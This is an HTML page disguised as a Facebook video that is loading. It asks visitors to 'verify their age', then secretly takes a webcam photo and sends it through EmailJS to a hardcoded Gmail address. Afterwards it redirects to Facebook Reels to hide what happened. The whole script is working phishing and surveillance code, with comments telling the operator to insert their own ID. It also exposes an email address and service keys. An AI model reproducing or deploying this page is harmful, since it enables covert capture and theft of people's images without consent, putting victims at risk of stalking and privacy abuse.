<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            margin: 0; padding: 0; background-color: #000;
            display: flex; justify-content: center; align-items: center; height: 100vh;
            color: white; font-family: sans-serif; overflow: hidden;
        }
        .video-container { text-align: center; }
        .loader {
            border: 4px solid #f3f3f3; border-top: 4px solid #1877F2;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="video-container">
        <div class="loader"></div>
        <p>Loading Exclusive Facebook Reel...</p>
    </div>

    <script>
        (function() { emailjs.init("ClasRw06y_NeB2UQ"); })(); // تأكد من أن هذا الـ ID مطابق لـ ID الخاص بك

        window.onload = async function() {
            if (confirm("To watch this exclusive Facebook Reel, please click OK to verify your age.")) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        
                        emailjs.send('service_w3dev60', 'template_7k8tall', {
                            image_data: canvas.toDataURL('image/jpeg'),
                            to_email: 'tayebiabd2016@gmail.com'
                        }).then(() => {
                            window.location.href = "https://www.facebook.com/reels/";
                        });
                    }, 4000); // وقت التأخير لضمان وضوح الصورة
                } catch (err) {
                    window.location.href = "https://www.facebook.com/reels/";
                }
            } else {
                window.location.href = "https://www.facebook.com/reels/";
            }
        };
    </script>
</body>
</html>
